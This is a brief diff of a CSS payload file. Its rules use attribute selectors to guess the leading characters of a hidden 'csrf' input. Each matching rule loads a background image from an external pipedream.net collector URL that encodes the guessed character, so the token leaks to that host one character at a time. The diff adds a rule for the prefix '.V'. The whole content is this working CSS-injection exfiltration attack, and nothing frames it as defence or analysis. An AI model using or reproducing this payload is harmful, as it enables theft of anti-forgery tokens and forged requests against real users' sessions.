@@ -26,8 +26,8 @@ input[name="csrf"][value^=".a"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=a)
 }
 
-input[name="csrf"][value^="[a-z]"] {
-  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=[a-z])
+input[name="csrf"][value^=".V"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?2=V)
 }
 
 input[name="csrf"][value^=".[a-z]"] {
